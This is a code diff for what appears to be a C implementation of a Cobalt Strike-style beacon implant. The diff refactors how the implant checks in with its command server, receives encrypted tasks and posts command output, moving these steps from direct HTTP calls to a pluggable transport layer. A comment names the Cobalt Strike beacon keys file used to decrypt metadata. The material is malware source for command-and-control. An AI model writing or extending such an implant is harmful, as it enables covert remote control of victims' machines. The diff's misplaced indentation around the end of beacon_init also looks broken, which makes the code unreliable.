@@ -1,7 +1,7 @@
 // (keeping imports the same)
 #include "beacon.h"
 #include "crypto.h"
-#include "http.h"
+#include "transport.h"
 #include "commands.h"
 #include "config.h"
 #include "profile.h"
@@ -111,13 +111,12 @@ int beacon_init(beacon_state_t *state) {
     state->tasks_len = 0;
     state->last_server_time = 0;
     state->upload_counter = 0;
-    state->output_buffer = NULL;
-    state->output_len = 0;
+        state->output_buffer = NULL;
+        state->output_len = 0;
     
-    return 0;
-}
-
-uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len)
+        return transport_init(state);
+    }
+    uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len)
 {
     // View the metadata of the beacon: python3 cs-decrypt-metadata.py -f .cobaltstrike.beacon_keys "<ENCRYPTED METADATA COOKIE>"
     // Metadata format:
@@ -442,25 +441,31 @@ int beacon_checkin(beacon_state_t *state)
     
     //DEBUG_PRINT("RSA encrypted metadata size: %zu bytes\n", encrypted_len);
     
-    // Send encrypted metadata via HTTP GET
-    http_response_t response;
-    if (http_get(profile_get_http_get_uri(), encrypted_metadata, encrypted_len, &response) != 0)
+    free(metadata);
+
+    // Send encrypted metadata
+    if (transport_send_metadata(state, encrypted_metadata, encrypted_len) != 0)
     {
-        free(metadata);
         return -1;
     }
     
-    free(metadata);
-    
+    // Receive tasks
+    uint8_t* response_data = NULL;
+    size_t response_size = 0;
+    if (transport_receive_tasks(state, &response_data, &response_size) != 0)
+    {
+        return -1;
+    }
+
     // If server sent tasks back, decrypt and process them
-    if (response.data && response.size > 0)
+    if (response_data && response_size > 0)
 	{
-        DEBUG_PRINT("Received response: %zu bytes\n", response.size);
+        DEBUG_PRINT("Received response: %zu bytes\n", response_size);
         
         uint8_t* task_data = NULL;
         size_t task_len = 0;
         
-        if (beacon_decrypt_tasks(state, (uint8_t*)response.data, response.size, &task_data, &task_len) == 0)
+        if (beacon_decrypt_tasks(state, (uint8_t*)response_data, response_size, &task_data, &task_len) == 0)
 		{
             DEBUG_PRINT("Decrypted task: %zu bytes\n", task_len);
             
@@ -474,12 +479,8 @@ int beacon_checkin(beacon_state_t *state)
             DEBUG_PRINT("Failed to decrypt tasks\n");
         }
     }
-	else
-	{
-        //DEBUG_PRINT("No response data from server\n");
-    }
     
-    http_response_free(&response);
+    if (response_data) free(response_data);
     state->connected = 1;
     
     return 0;
@@ -625,18 +626,11 @@ int beacon_send_output(beacon_state_t *state, const char *output, size_t len)
 
 	DEBUG_HEX("Complete packet", packet, total_len);
     
-    // Send via HTTP POST
-    http_response_t response;
-    char session_id[33];
-    snprintf(session_id, sizeof(session_id), "%d", state->agent_id);
-    
-    DEBUG_PRINT("Sending POST request with %zu bytes\n", total_len);
-    
-    int ret = http_post(profile_get_http_post_uri(), packet, total_len, session_id, &response);
-    
+    // Send via transport
+    int ret = transport_send_output(state, packet, total_len);
+
     free(packet);
-    http_response_free(&response);
-    
+
     return ret;
 }
 
@@ -655,6 +649,7 @@ void beacon_sleep(void)
 
 void beacon_cleanup(beacon_state_t *state)
 {
+    transport_cleanup();
     if (state->pending_tasks) {
         free(state->pending_tasks);
         state->pending_tasks = NULL;
